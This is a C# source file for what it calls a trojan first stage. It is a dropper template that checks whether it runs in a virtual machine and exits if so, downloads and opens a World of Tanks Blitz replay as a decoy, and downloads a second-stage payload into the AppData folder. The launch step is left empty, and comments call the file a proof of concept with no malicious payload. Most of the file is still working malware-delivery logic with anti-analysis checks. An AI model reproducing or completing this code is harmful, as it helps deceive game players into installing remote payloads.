using System.ComponentModel.DataAnnotations;
using System.Diagnostics;
using System.Management;


namespace TrojanPayload
{
    /// <summary>
    /// First stage executable does not currently support the use 
    /// of external packages. Please stick to the standard ones.
    /// </summary>
    class PayloadSource
    {   
        // First stage replay uri
        [Editable(true)]
        public const string ReplayCdnUri = "https://www.wotblitzreplays.com/files/replays/20230323_1143__Dr3kka_A140_ASTRON_REX_105_2318957354229178159.wotbreplay";

        // Determines if trojan compiler will compile the 
        // If true: the entire class gets compiled into the first stage executable
        // If false: compiled first stage executable is inert and only prints hello world
        [Editable(true)]
        public const bool ActiveSecondStagePayload = false;

        // Second stage payload uri
        [Editable(true)]
        private const string SecondStageFileUri = "";

        // Name of deployed payload file. (can be obfuscated)
        [Editable(true)]
        private const string SecondStageFileName = "maelstrom";

        // Toggle if first stage can be ran in a virtual machine
        [Editable(true)]
        private const bool permissionToRunInsideVM = true;


        private static readonly HttpClient httpClient = new(
                    new HttpClientHandler()
                    {
                        AllowAutoRedirect = true,
                        MaxAutomaticRedirections = 5
                    })
        {
            Timeout = TimeSpan.FromSeconds(10)
        };


        /// <summary>
        /// Payload main
        /// </summary>
        private static async void Main()
        {
            if (!permissionToRunInsideVM && IsRunningInVirtualMachine())
                Environment.Exit(0);

            Task[] FileIntegrityCheck = [ VerifyUriIntegrity(ReplayCdnUri), VerifyUriIntegrity(SecondStageFileUri) ];
            await Task.WhenAll(FileIntegrityCheck);

            string replayPath = await DownloadReplay();
            await OpenReplay(replayPath);

            string payloadPath = await DownloadPayload();
            await DeplayPayload(payloadPath);
        }


        /// <summary>
        /// Checks if the program is being run in a virtual machine
        /// </summary>
        /// <returns></returns>
        private static bool IsRunningInVirtualMachine()
        {
            if (Environment.OSVersion.Platform != PlatformID.Win32NT)
                return false;

            try
            {
                #pragma warning disable CA1416 // Validate platform compatibility
                using ManagementObjectSearcher search = new ("Select * from Win32_ComputerSystem");
                using ManagementObjectCollection results = search.Get();
                foreach (ManagementBaseObject result in results)
                {
                    string manufacturer = result["Manufacturer"].ToString() is string manufacturerData && manufacturerData is not null 
                        ? manufacturerData.ToLower() 
                        : throw new InvalidDataException();

                    string model = result["Model"].ToString() is string modelData && modelData is not null
                        ? modelData
                        : throw new InvalidDataException();

                    return (manufacturer == "microsoft corporation" && modelData.Contains("VIRTUAL", StringComparison.InvariantCultureIgnoreCase))
                            || manufacturer.Contains("vmware", StringComparison.InvariantCultureIgnoreCase)
                            || modelData.Contains("VirtualBox", StringComparison.InvariantCultureIgnoreCase);
                }
                #pragma warning restore CA1416 // Validate platform compatibility
            }
            catch { }

            return false;
        }


        private static async Task VerifyUriIntegrity(string uri)
        {
            try
            {
                //Assert.True(!string.IsNullOrEmpty(ReplayCdnUri));
                if (!Uri.TryCreate(uri, UriKind.RelativeOrAbsolute, out Uri? parsedUri) || parsedUri is null)
                    throw new InvalidDataException("ERROR: Replay uri is in an unsupported format.");

                using HttpResponseMessage response = await httpClient.SendAsync(new(HttpMethod.Head, parsedUri));
                if (!response.IsSuccessStatusCode)
                    throw new InvalidDataException();

            }
            catch
            {
                Environment.Exit(0);
            }
        }


        /// <summary>
        /// Downloads masking replay
        /// </summary>
        /// <returns></returns>
        private static async Task<string> DownloadReplay()
        {
            string outputFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache), ReplayCdnUri.Split('/', 2)[^1]);

            if (File.Exists(outputFile))
                File.Delete(outputFile);

            byte[] fileBytes = await httpClient.GetByteArrayAsync(ReplayCdnUri);

            File.WriteAllBytes(outputFile, fileBytes);

            return outputFile;
        }


        /// <summary>
        /// Launches masking replay
        /// </summary>
        /// <param name="replayPath"></param>
        /// <returns></returns>
        private static async Task OpenReplay(string replayPath)
        {
            string steamPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam\\steamapps\\common\\World of Tanks Blitz\\wotblitz.exe");
            if (File.Exists(steamPath))
            {
                try
                {
                    Process.Start(steamPath, replayPath);
                    await Task.Delay(5000);

                    return;
                }
                catch { }
            }

            // If steam client is not found, attempt to find ms store or wgc client
            Process.Start("explorer.exe", replayPath);

            await Task.Delay(5000);
        }


        /// <summary>
        /// Second stage payload
        /// </summary>
        /// <returns></returns>
        private static async Task<string> DownloadPayload()
        {
            string payloadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SecondStageFileName);

            if (File.Exists(payloadPath))
                File.Delete(payloadPath);

            byte[] fileBytes = await httpClient.GetByteArrayAsync(SecondStageFileUri);

            File.WriteAllBytes(payloadPath, fileBytes);

            return payloadPath;
        }


        /// <summary>
        /// Launch second stage payload
        /// </summary>
        /// <param name="payloadPath"></param>
        /// <returns></returns>
        private static async Task DeplayPayload(string payloadPath)
        {
            // Detect payload type (.ps1, .exe, .bat) etc to properly deploy it
            // Or just write explorer.exe and open it with default program


            // This is only a template, and malicious payload is not provided
            // This repository is only for proof of concept.
            // I do not condone or support use of my work for any sort of
            // malicious, illigal or illicit activities.


            await Task.Delay(1000);
        }
    }
}
